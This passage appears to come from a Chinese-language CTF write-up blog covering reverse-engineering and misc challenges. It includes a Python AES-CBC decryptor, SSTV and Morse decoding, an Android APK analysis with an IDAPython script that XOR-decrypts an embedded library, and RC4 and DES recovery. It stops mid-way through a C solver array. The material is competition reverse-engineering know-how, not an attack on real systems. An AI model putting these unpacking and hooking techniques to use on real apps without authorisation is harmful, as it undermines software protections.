class="number">16</span>):</span><br><span class="line">        block = ct[i:i+<span class="number">16</span>]</span><br><span class="line">        dec = block_decrypt(block, rks)</span><br><span class="line">        out.extend(xor_bytes(dec, prev))</span><br><span class="line">        prev = block</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pkcs7_unpad</span>(<span class="params">data: <span class="built_in">bytes</span>, blocksize: <span class="built_in">int</span> = <span class="number">16</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> <span class="built_in">len</span>(data) % blocksize != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid padded data length&quot;</span>)</span><br><span class="line">    pad = data[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> pad == <span class="number">0</span> <span class="keyword">or</span> pad &gt; blocksize:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Bad PKCS#7 padding value&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[-pad:] != <span class="built_in">bytes</span>([pad])*pad:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Bad PKCS#7 padding bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data[:-pad]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- Demo with your data ----------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">b&quot;Syclover2025Geek&quot;</span>          <span class="comment"># 16 bytes</span></span><br><span class="line">    iv  = <span class="string">b&quot;1145141145144332&quot;</span>          <span class="comment"># 16 bytes</span></span><br><span class="line">    ct  = <span class="built_in">bytes</span>([</span><br><span class="line">        <span class="number">0xB2</span>, <span class="number">0xB3</span>, <span class="number">0xDC</span>, <span class="number">0xB9</span>, <span class="number">0xF8</span>, <span class="number">0xD6</span>, <span class="number">0x93</span>, <span class="number">0xFF</span>, <span class="number">0xB5</span>, <span class="number">0xA1</span>,</span><br><span class="line">        <span class="number">0xCC</span>, <span class="number">0x2A</span>, <span class="number">0x6F</span>, <span class="number">0xDE</span>, <span class="number">0x27</span>, <span class="number">0x44</span>, <span class="number">0xAF</span>, <span class="number">0x21</span>, <span class="number">0x98</span>, <span class="number">0xDD</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0D</span>, <span class="number">0x1C</span>, <span class="number">0x53</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x3E</span>, <span class="number">0x16</span>, <span class="number">0xAB</span>,</span><br><span class="line">        <span class="number">0xDF</span>, <span class="number">0x13</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    pt = cbc_decrypt(ct, iv, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Plain (hex):&quot;</span>, pt.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Plain (raw):&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        unpadded = pkcs7_unpad(pt, <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Unpadded (hex):&quot;</span>, unpadded.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Unpadded (raw):&quot;</span>, unpadded.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Password (len=&#123;&#125;): &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(unpadded), unpadded))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Padding check failed:&quot;</span>, e)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109170143802.png"></p><p>解压之后是一个wav文件</p><p>把这个文件丢给ai帮忙分析</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109170257482.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109170239927.png"></p><p>之后我用RX-SSTV提取出来了一个二维码图片</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109170341378.bmp" alt="temp"></p><p>扫码之后下载了一个secret.zip</p><p>解压hi后还是一个wav文件，点开听发现是摩斯电码</p><p>直接让ai帮我解摩斯电码</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109170449702.png"></p><h3 id="re-QYQSの奇妙冒险2"><a href="#re-QYQSの奇妙冒险2" class="headerlink" title="re-QYQSの奇妙冒险2"></a>re-QYQSの奇妙冒险2</h3><p>直接在字符串里面搜索</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109170608996.png"></p><p>这就是flag</p><h3 id="re-GeekBinder"><a href="#re-GeekBinder" class="headerlink" title="re-GeekBinder"></a>re-GeekBinder</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109171441738.png"></p><h3 id="re-ez-vm"><a href="#re-ez-vm" class="headerlink" title="re-ez_vm"></a>re-ez_vm</h3><p>这题有点运气成分，把代码丢给ai，说要和0x5a进行异或</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109180742579.png"></p><p>并且说密文长度为29</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109180822493.png"></p><p>推测这个为密文</p><p>用SYC{为前缀进行猜测，和0x5a异或</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109180933444.png"></p><p>发现和正确的密文之前就差了3</p><p>所以<img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109181004447.png"></p><h3 id="re-ez-android"><a href="#re-ez-android" class="headerlink" title="re-ez_android"></a>re-ez_android</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109214137822.png"></p><p>先在手机端查看，发现flag有三个块</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109214037836.png"></p><p>接着在mainactivity分析，发现主要逻辑可能在second中</p><p>接着进second分析</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109214359973.png"></p><p>找到这个关键点</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109214423246.png"></p><p>跟到cryptoprocessor中</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109214513874.png"></p><p>用jadx反编译有报错，就在smali中看smali语法</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109214739243.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109214824454.png"></p><p>发现这里指定了路径，在资源文件中找</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109214855430.png"></p><p>找到了对应的密文</p><p>接着找每一部分对应的加密方法</p><p>当时找了半天找不到在哪</p><p>所以试着在so文件里面碰碰运气，发现有一个libfunction3.so</p><p>所以在java中搜了搜function</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109215343743.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109215403172.png"></p><p>function1用DES&#x2F;ECB&#x2F;NoPadding</p><p>先把flag1 16进制转字符串</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109215524875.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109215617923.png"></p><p>解出flag1</p><p>进ida分析libwrapper.so</p><p>在里面找到function2</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251111202035405.png"></p><p>光看这个代码发现function2其实什么都没有</p><p>接着在Funtion name里面找到了一个可疑函数decrypt_xor</p><p>跟进去看</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251111202449494.png"></p><p>接着往上跟</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251111202533036.png"></p><p>发现这个程序其实是把encrypted_so这个数据和0xAA异或进行解密，才能显示正确的逻辑</p><p>这里直接用idapython把so文件还原</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_encrypted_so</span>(<span class="params">symbol_data=<span class="string">&quot;encrypted_so&quot;</span>,</span></span><br><span class="line"><span class="params">                      symbol_len=<span class="string">&quot;encrypted_so_len&quot;</span>,</span></span><br><span class="line"><span class="params">                      xor_key=<span class="number">0xAA</span></span>):</span><br><span class="line">    <span class="comment"># 找加密数据起始地址</span></span><br><span class="line">    enc_ea = ida_name.get_name_ea(ida_idaapi.BADADDR, symbol_data)</span><br><span class="line">    <span class="keyword">if</span> enc_ea == ida_idaapi.BADADDR:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 找不到符号 <span class="subst">&#123;symbol_data&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找长度（假设是 4 字节小端整型：C0 1A 00 00 -&gt; 0x1AC0）</span></span><br><span class="line">    len_ea = ida_name.get_name_ea(ida_idaapi.BADADDR, symbol_len)</span><br><span class="line">    <span class="keyword">if</span> len_ea == ida_idaapi.BADADDR:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 找不到符号 <span class="subst">&#123;symbol_len&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    enc_len = ida_bytes.get_wide_dword(len_ea)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> enc_len <span class="keyword">or</span> enc_len &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 长度异常: <span class="subst">&#123;enc_len&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;symbol_data&#125;</span> @ 0x<span class="subst">&#123;enc_ea:X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;symbol_len&#125;</span> = 0x<span class="subst">&#123;enc_len:X&#125;</span> (<span class="subst">&#123;enc_len&#125;</span> bytes)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取并解密</span></span><br><span class="line">    buf = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(enc_len):</span><br><span class="line">        b = ida_bytes.get_byte(enc_ea + i)</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0xFF</span> <span class="keyword">and</span> ida_bytes.is_unknown(ida_bytes.get_full_flags(enc_ea + i)):</span><br><span class="line">            <span class="comment"># 理论上不会触发，只是防止乱读</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 读到未定义字节 @ 0x<span class="subst">&#123;enc_ea + i:X&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        buf.append(b ^ xor_key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择输出文件</span></span><br><span class="line">    out_path = ida_kernwin.ask_file(<span class="literal">True</span>, <span class="string">&quot;decrypted_real.so&quot;</span>, <span class="string">&quot;保存解密后的 so 为&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> out_path:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 已取消保存文件&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(buf)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 解密完成，已写出到: <span class="subst">&#123;out_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    dump_encrypted_so()</span><br></pre></td></tr></table></figure></div><p>解密之后在ida里面找到function2</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251111203142669.png"></p><p>直接解rc4</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251111203337736.png"></p><p>接着看到libfunction3.so</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251111204018233.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251111204126832.png"></p><p>知道是des加密，但是解半天解不出来，应该是在某个地方进行了魔改</p><p>由于des加密的对称性，所以就尝试用hook的方式，把flag3丢给des_crypt进行解密</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251111205221223.png"></p><p>这里需要注意的是，需要解出前面两个空才会走到function3这个so文件里面，才能成功调用这个函数</p><h3 id="re-obfuscat3"><a href="#re-obfuscat3" class="headerlink" title="re-obfuscat3"></a>re-obfuscat3</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121195917928.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121195931673.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121200014947.png"></p><p>说是混淆，尝试动态调试进行分析</p><p>全输入1试试看先</p><p>把加密过后的数据提取出来</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121200134332.png"></p><p>再全输入2试试看</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121200220483.png"></p><p>发现两个数据之间的差和asc码之间的差是一样的，如此可以根据密文来推算明文</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121200311094.png"></p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> a[]=&#123;</span><br><span class="line">		<span class="number">0x92</span>, <span class="number">0xA5</span>, <span class="number">0x57</span>, <span class="number">0x0A</span>, <span class="number">0xAD</span>, <span class="number">0x2C</span>, <span class="number">0xDF</span>, <span class="number">0x65</span>, <span class="number">0xBC</span>, <span class="number">0x8C</span>, </span><br><span class="line">		<span class="number">0xE1</span>, <span class="number">0xE6</span>, <span class="number">0xAA</span>, <span class="number">0xED</span>, <span class="number">0xA7</span>, <span class="number">0x27</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0x0B</span>, </span><br><span class="line">		<span class="number">0x8E</span>, <span class="number">0xC9</span>, <span class="number">0x1C</span>, <span class="number">0xDD</span>, <span class="number">0x47</span>, <span class="number">0x6A</span>, <span class="number">0xA7</span>, <span class="number">0xB9</span>, <span class="number">0xBB</span>, <span class="number">0xB6</span>, </span><br><span class="line">		<span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0xC2</span>, <span class="number">0x6C</span>, <span class="number">0x4F</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x23</span>, <span class="number">0x70</span>, <span class="number">0x53</span>, </span><br><span class="line">		<span class="number">0xE9</span>, <span class="number">0x29</span>, <span class="number">0xD3</span>, <span class="number">0x9B</span>, <span class="number">0xF0</span>, <span class="number">0x35</span>, <span class="number">0xAC</span>, <span class="number">0xDD</span>, <span class="number">0x25</span>, <span class="number">0x0C</span>, </span><br><span class="line">		<span class="number">0x11</span>, <span class="number">0x2E</span>, <span class="number">0x9B</span>, <span class="number">0x02</span>, <span class="number">0xC4</span>, <span class="number">0x46</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0xEB</span>, <span class="number">0x64</span>, </span><br><span class="line">		<span class="number">0xB7</span>, <span class="number">0x4E</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0x75</span>, <span class="number">0xD8</span>, <span class="number">0xBA</span>, <span class="number">0x6B</span>, <span class="number">0x0E</span>, <span class="number">0x41</span>, </span><br><span class="line">		<span class="number">0x34</span>, <span class="number">0xEA</span>, <span class="number">0x07</span>, <span class="number">0x22</span>, <span class="number">0x1A</span>, <span class="number">0x35</span>, <span class="number">0x84</span>, <span class="number">0xCB</span>, <span class="number">0x0D</span>, <span class="number">0x46</span>, </span><br><span class="line">		<span class="number">0xD1</span>, <span class="number">0x03</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x7C</span>, <span class="number">0x96</span>, <span class="number">0x8A</span>, <span class="number">0xC7</span>, <span class="number">0x7C</span>, <span class="number">0x00</span>, </span><br><span class="line">		<span class="number">0xB5</span>, <span class="number">0x16</span>, <span class="number">0x41</span>, <span class="number">0xC1</span>, <span class="number">0xDF</span>, <span class="number">0xB5</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x41</span>, </span><br><span class="line">		<span class="number">0x9C</span>, <span class="number">0x9F</span>, <span class="number">0x48</span>, <span class="number">0xD1</span>, <span class="number">0x5E</span>, <span class="number">0x79</span>, <span class="number">0x19</span>, <span class="number">0x3D</span>, <span class="number">0x6A</span>, <span class="number">0x96</span>, </span><br><span class="line">		<span class="number">0xB2</span>, <span class="number">0x50</span>, <span class="number">0xA9</span>, <span class="number">0x72</span>, <span class="number">0x63</span>, <span class="number">0x0A</span>, <span class="number">0xCA</span>, <span class="number">0x2C</span>, <span class="number">0x56</span>, <span class="number">0xC7</span>, </span><br><span class="line">		<span class="number">0xD3</span>, <span class="number">0xEB</span>, <span class="number">0xC7</span>, <span class="number">0x95</span>, <span class="number">0x19</span>, <span class="number">0xDC</span>, <span class="number">0x85</span>, <span class="number">0xE9</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, </span><br><span class="line">		<span class="number">0xEE</span>, <span class="number">0x05</span>, <span class="number">0xD9</span>, <span class="number">0xA3</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xD4</span>, <span class="number">0xC8</span>, <span class="number">0xDB</span>, <span class="number">0x35</span>, </span><br><span class="line">		<span class="number">0xB2</span>, <span class="number">0xF2</span>, <span class="number">0xDE</span>, <span class="number">0x47</span>, <span class="number">0x33</span>, <span class="number">0xA9</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x5A</span>, <span class="number">0x92</span>, </span><br><span class="line">		<span class="number">0x11</span>, <span class="number">0xFA</span>, <span class="number">0x40</span>, <span class="number">0x6F</span>, <span class="number">0xDA</span>, <span class="number">0x57</span>, <span class="number">0x61</span>, <span class="number">0x5C</span>, <span class="number">0x3D</span>, <span class="number">0xD0</span>, </span><br><span class="line">		<span class="number">0x23</span>, <span class="number">0xE6</span>, <span class="number">0x00</span>, <span class="number">0x83</span>, <span class="number">0xE9</span>, <span class="number">0x87</span>, <span class="number">0x71</span>, <span class="number">0x3C</span>, <span class="number">0x13</span>, <span class="number">0xFC</span>, </span><br><span class="line">		<span class="number">0x21</span>, <span class="number">0xDC</span>, <span class="number">0x98</span>, <span class="number">0x34</span>, <span class="number">0xDC</span>, <span class="number">0x51</span>, <span class="number">0x65</span>, <span class="number">0x10</span>, <span class="number">0x4D</span>, <span class="number">0xF6</span>, </span><br><span class="line">		<span class="number">0x3C</span>, <span class="number">0xAA</span>, <span class="number">0x90</span>, <span class="number">0x95</span>, <span class="number">0x27</span>, <span class="number">0x61</span>, <span class="number">0x39</span>, <span class="number">0xE0</span>, <span class="number">0x3C</span>, <span class="number">0xD1</span>, </span><br><span class="line">		<span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x0B</span>, <span class="number">0xA6</span>, <span class="number">0x7E</span>, <span class="number">0x0D</span>, <span class="number">0x4D</span>, <span class="number">0x66</span>, <span class="number">0xF9</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">int</span> b[]=&#123;</span><br><span class="line">		<span class="number">0xB4</span>, <span class="number">0xCD</span>, <span class="number">0x69</span>, <span class="number">0x54</span>, <span class="number">0xBD</span>, <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0x9D</span>, <span class="number">0xF2</span>, <span class="number">0xC3</span>, </span><br><span class="line">		<span class="number">0x24</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x1B</span>, <span class="number">0xE9</span>, <span class="number">0x6A</span>, <span class="number">0x44</span>, <span class="number">0x14</span>, <span class="number">0x4E</span>, <span class="number">0x39</span>, </span><br><span class="line">		<span class="number">0xC5</span>, <span class="number">0xC8</span>, <span class="number">0x5B</span>, <span class="number">0x11</span>, <span class="number">0x75</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xBB</span>, <span class="number">0xFE</span>, <span class="number">0xE4</span>, </span><br><span class="line">		<span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x06</span>, <span class="number">0x9A</span>, <span class="number">0x91</span>, <span class="number">0xFE</span>, <span class="number">0xA0</span>, <span class="number">0x68</span>, <span class="number">0xA4</span>, <span class="number">0x86</span>, </span><br><span class="line">		<span class="number">0x17</span>, <span class="number">0x6C</span>, <span class="number">0x0A</span>, <span class="number">0xCF</span>, <span class="number">0x1E</span>, <span class="number">0x67</span>, <span class="number">0xE3</span>, <span class="number">0x0D</span>, <span class="number">0x60</span>, <span class="number">0x47</span>, </span><br><span class="line">		<span class="number">0x13</span>, <span class="number">0x6B</span>, <span class="number">0xD1</span>, <span class="number">0x36</span>, <span class="number">0xF2</span>, <span class="number">0x77</span>, <span class="number">0x58</span>, <span class="number">0x76</span>, <span class="number">0x1E</span>, <span class="number">0x98</span>, </span><br><span class="line">		<span class="number">0xF5</span>, <span class="number">0x7F</span>, <span class="number">0x0A</span>, <span class="number">0x92</span>, <span class="number">0xB7</span>, <span class="number">0x0A</span>, <span class="number">0xEA</span>, <span class="number">0xAE</span>, <span class="number">0x46</span>, <span class="number">0x7E</span>, </span><br><span class="line">		<span class="number">0x6A</span>, <span class="number">0x18</span>, <span class="number">0x4A</span>, <span class="number">0x59</span>, <span class="number">0x4E</span>, <span class="number">0x71</span>, <span class="number">0xB2</span>, <span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0x7A</span>, </span><br><span class="line">		<span class="number">0x0B</span>, <span class="number">0x31</span>, <span class="number">0xBA</span>, <span class="number">0xC6</span>, <span class="number">0xAA</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0x09</span>, <span class="number">0xBF</span>, <span class="number">0x2E</span>, </span><br><span class="line">		<span class="number">0xF8</span>, <span class="number">0x4D</span>, <span class="number">0x75</span>, <span class="number">0xEF</span>, <span class="number">0x14</span>, <span class="number">0xED</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x6F</span>, </span><br><span class="line">		<span class="number">0xDE</span>, <span class="number">0xE2</span>, <span class="number">0x7C</span>, <span class="number">0x10</span>, <span class="number">0x8C</span>, <span class="number">0xB7</span>, <span class="number">0x4E</span>, <span class="number">0x6B</span>, <span class="number">0xB2</span>, <span class="number">0xD4</span>, </span><br><span class="line">		<span class="number">0xF6</span>, <span class="number">0x91</span>, <span class="number">0xD7</span>, <span class="number">0x84</span>, <span class="number">0x86</span>, <span class="number">0x1F</span>, <span class="number">0xF8</span>, <span class="number">0x65</span>, <span class="number">0x94</span>, <span class="number">0x0B</span>, </span><br><span class="line">		<span class="number">0x14</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0xDD</span>, <span class="number">0x47</span>, <span class="number">0xF4</span>, <span class="number">0xC1</span>, <span class="number">0x17</span>, <span class="number">0x42</span>, <span class="number">0x3F</span>, </span><br><span class="line">		<span class="number">0x1E</span>, <span class="number">0x38</span>, <span class="number">0x07</span>, <span class="number">0xBB</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x16</span>, <span class="number">0x68</span>, </span><br><span class="line">		<span class="number">0xE0</span>, <span class="number">0x23</span>, <span class="number">0x12</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0xD9</span>, <span class="number">0x71</span>, <span class="number">0x7A</span>, <span class="number">0x88</span>, <span class="number">0xD0</span>, </span><br><span class="line">		<span class="number">0x46</span>, <span class="number">0x28</span>, <span class="number">0x88</span>, <span class="number">0xAD</span>, <span class="number">0x1E</span>, <span class="number">0x98</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x7E</span>, <span class="number">0x0E</span>, </span><br><span class="line">		<span class="number">0x69</span>, <span class="number">0x29</span>, <span class="number">0x37</span>, <span class="number">0xB1</span>, <span class="number">0xFF</span>, <span class="number">0xC5</span>, <span class="number">0xAF</span>, <span class="number">0x6F</span>, <span class="number">0x41</span>, <span class="number">0x37</span>, </span><br><span class="line">		<span class="number">0x65</span>, <span class="number">0x0E</span>, <span class="number">0xD2</span>, <span class="number">0x62</span>, <span class="number">0x11</span>, <span class="number">0x8F</span>, <span class="number">0xA6</span>, <span 